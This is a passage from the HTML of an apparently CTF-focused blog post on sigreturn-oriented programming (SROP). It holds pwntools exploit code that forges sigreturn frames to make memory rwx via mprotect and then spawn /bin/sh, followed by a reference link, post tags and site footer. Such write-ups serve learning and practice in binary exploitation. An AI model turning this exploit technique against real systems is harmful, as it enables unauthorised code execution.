rt_sigreturn</span><br><span class="line"># 59  execve</span><br><span class="line"></span><br><span class="line">main_addr = exe.sym[&quot;main&quot;]</span><br><span class="line">syscall_ret_addr = 0x00401018</span><br><span class="line">fake_rwx_stack_addr = 0x004020b8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mprotect_frame = SigreturnFrame()</span><br><span class="line">mprotect_frame.rip = syscall_ret_addr # return to main and do other thing</span><br><span class="line">mprotect_frame.rsp = fake_rwx_stack_addr</span><br><span class="line">mprotect_frame.rax = constants.SYS_mprotect</span><br><span class="line">mprotect_frame.rdi = 0x00402000</span><br><span class="line">mprotect_frame.rsi = 0x1000</span><br><span class="line">mprotect_frame.rdx = 7 # rwx</span><br><span class="line"></span><br><span class="line">do_mprotect = flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        main_addr,</span><br><span class="line">        syscall_ret_addr,</span><br><span class="line">        bytes(mprotect_frame)</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">input(&quot;send mprotect payload&quot;)</span><br><span class="line">io.send(do_mprotect) # set up sigreturn frame</span><br><span class="line">input(&quot;trigger sigreturn and mprotect&quot;)</span><br><span class="line">io.send(do_mprotect[8:8+15]) # read 15 bytes, trigger sigreturn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">execve_bin_sh_frame = SigreturnFrame()</span><br><span class="line">execve_bin_sh_frame.rip = syscall_ret_addr # return to main and do other thing</span><br><span class="line">execve_bin_sh_frame.rsp = fake_rwx_stack_addr # </span><br><span class="line">execve_bin_sh_frame.rax = constants.SYS_execve</span><br><span class="line">execve_bin_sh_frame.rdi = fake_rwx_stack_addr +8+ len(flat(&#123;0:[main_addr,syscall_ret_addr,bytes(execve_bin_sh_frame)]&#125;))</span><br><span class="line">execve_bin_sh_frame.rsi = 0</span><br><span class="line">execve_bin_sh_frame.rdx = 0</span><br><span class="line"></span><br><span class="line">do_execve_bin_sh = flat(&#123;</span><br><span class="line">    0:[</span><br><span class="line">        main_addr,</span><br><span class="line">        syscall_ret_addr,</span><br><span class="line">        bytes(execve_bin_sh_frame),</span><br><span class="line">        b&quot;/bin/sh\x00&quot;,</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input(&quot;send execve bin/sh payload&quot;)</span><br><span class="line">io.send(do_execve_bin_sh) # set up sigreturn frame</span><br><span class="line">input(&quot;trigger sigreturn and mprotect&quot;)</span><br><span class="line">io.send(do_execve_bin_sh[8:8+15]) # read 15 bytes, trigger sigreturn</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://www.2cto.com/article/201512/452080.html">https://www.2cto.com/article/201512/452080.html</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+              <a href="/tags/srop/" rel="tag"># srop</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/03/29/ctf/first-glance-of-alloca-in-ctf/" rel="prev" title="first glance of alloca in ctf">
+                  <i class="fa fa-chevron-left"></i> first glance of alloca in ctf
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/04/21/life/maple-bacon-first-first-place-in-ctf/" rel="next" title="MapleBacon First 1st Place in CTF">
+                  MapleBacon First 1st Place in CTF <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Aynakeya</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
